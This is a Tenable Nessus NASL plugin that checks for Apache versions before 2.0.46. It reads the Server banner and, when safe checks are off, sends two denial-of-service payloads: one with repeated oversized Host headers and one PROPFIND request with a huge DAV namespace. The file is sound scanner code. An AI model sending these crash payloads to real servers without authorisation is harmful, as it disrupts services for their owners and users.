#
# (C) Tenable Network Security, Inc.
#

# Ref:
#  Date: Wed, 28 May 2003 12:29:03 -0400 (EDT)
#  From: Apache HTTP Server Project <jwoolley@apache.org>
#  To: <bugtraq@securityfocus.com>
#  Subject: [SECURITY] [ANNOUNCE] Apache 2.0.46 released


include("compat.inc");

if(description)
{
 script_id(11665);
 script_version("$Revision: 1.21 $");

 script_cve_id("CVE-2003-0245", "CVE-2003-0189");
 script_bugtraq_id(7723, 7725);
 script_xref(name:"OSVDB", value:"4340");
 script_xref(name:"OSVDB", value:"9714");
 script_xref(name:"IAVA", value:"2003-t-0012");
 script_xref(name:"RHSA", value:"RHSA-2003:186-01");

 script_name(english: "Apache < 2.0.46 Multiple DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to several denial of service
attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running a version of Apache 2.0 that is
older than 2.0.46.  Such versions have various flaws :

  - There is a denial of service vulnerability that may 
    allow an attacker to disable basic authentication on 
    this host.

  - There is a denial of service vulnerability in the 
    mod_dav module that may allow an attacker to crash this 
    service remotely." );
 script_set_attribute(attribute:"see_also", value:"http://www.apache.org/dist/httpd/CHANGES_2.0" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.0.46 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:L/AC:M/Au:N/C:N/I:N/A:P" );
script_end_attributes();

 script_summary(english: "Checks for version of Apache");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencie("find_service1.nasl", "no404.nasl", "http_version.nasl");
 script_require_keys("www/apache");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("backport.inc");

port = get_http_port(default:80, embedded: 0);

banner = get_backport_banner(banner:get_http_banner(port: port));
if (!banner) exit(0);

if (safe_checks())
{
  if ("Server:" >< banner && "Apache" >< banner)
  {
    serv = strstr(banner, "Server:");
    serv = serv - strstr(serv, '\n');
    serv = chomp(serv);

    pat = "^Server:.*Apache(-AdvancedExtranetServer)?/(2\.0\.([0-9][^0-9]|[0-3][0-9]|4[0-5]))";
    match = eregmatch(pattern:pat, string:serv);
    if (!isnull(match))
    {
      version = match[2];
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Apache ", version, " appears to be running on the remote host based on the\n",
          "following Server response header :\n",
          "\n",
          "  ", serv, "\n"
        );
        security_note(port:port, extra:report);
      }
      else security_note(port);
    }
  }
  exit(0);
}
else
{
  #
  # I could not make these exploits to work (RH8.0), but we'll include them
  # anyway.
  #
  if(http_is_dead(port:port))exit(0);

  req = 'GET / HTTP/1.1\r\n';
  for(i=0;i<10;i++)
   req = strcat(req, 'Host: ', crap(2000), '\r\n');
  req += '\r\n';

  # The new API does not allow us to set the same header several times
  r = http_send_recv_buf(port: port, data: req);

  if (http_is_dead(port: port, retry: 3))
  {
   security_note(port);
   exit(0);
  }

  xml = '<?xml version="1.0"?>\r\n' + 
        '<a:propfind xmlns:a="' + 'DAV:' + crap(20000) + '">\r\n' +
        '    <a:allprop/>\r\n' +
        '</a:propfind>';
     
  r = http_send_recv3(port: port, method: 'PROPFIND', item: '/', data: xml,
    add_headers: make_array( 'Depth', '1',
                             'Content-Type', 'text/xml; charset="utf-8"') );
  if (http_is_dead(port: port, retry: 3)) security_note(port);
}
